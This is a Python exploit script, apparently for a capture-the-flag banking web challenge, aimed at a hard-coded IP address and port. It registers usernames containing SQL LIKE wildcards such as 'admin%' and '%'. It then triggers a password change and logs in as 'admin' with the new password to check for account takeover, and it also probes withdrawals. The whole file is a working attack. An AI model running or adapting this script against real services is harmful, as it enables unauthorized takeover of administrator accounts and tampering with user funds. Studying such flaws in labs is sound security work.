import urllib.request, urllib.parse, http.cookiejar, re, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://103.163.47.230:33681"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def req(op, p, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b)).strip()


def state(op):
    s, b = req(op, "/dashboard")
    t = clean(b)
    m = re.search(r"我的账户（(.*?)）", t)
    d = re.search(r"(\d+) 存款余额", t)
    c = re.search(r"(\d+) 现金金币", t)
    emp = "内部员工" in t and "暂不可用" not in t
    return (m.group(1) if m else "?"), (d.group(1) if d else "?"), (c.group(1) if c else "?"), emp


print("=== 注册通配符用户名并测试")
for uname in ["admin%", "adm%", "a%", "%", "admin_", "admi_"]:
    op = sess()
    pw = "P1"
    s, b = req(op, "/register", {"username": uname, "password": pw}, "POST")
    v = "TAKEN" if "已被占用" in b else ("OK" if "开户成功" in b else clean(b)[:40])
    if v != "OK":
        print(f"  {uname!r:10s} reg={v}")
        continue
    s, b = req(op, "/login", {"username": uname, "password": pw}, "POST")
    acct, d, c, emp = state(op)
    print(f"  {uname!r:10s} reg=OK login acct={acct!r} dep={d} cash={c} EMP={emp}")

    # 提现测试
    s2, b2 = req(op, "/withdraw", {"amount": "100"}, "POST")
    print(f"      withdraw -> {clean(b2)[:80]}")

    # 改密（看是否连带 admin）
    NEW = "HACK" + str(abs(hash(uname)) % 1000)
    s3, b3 = req(op, "/change_password", {"new_password": NEW}, "POST")
    op2 = sess()
    s4, b4 = req(op2, "/login", {"username": "admin", "password": NEW}, "POST")
    hit = "我的账户" in b4
    print(f"      change_password -> admin/{NEW} = {'*** HIT ***' if hit else 'no'}")
    if hit:
        a2, d2, c2, e2 = state(op2)
        print(f"      >>> admin 已拿下: acct={a2!r} dep={d2} cash={c2} EMP={e2}")
        break
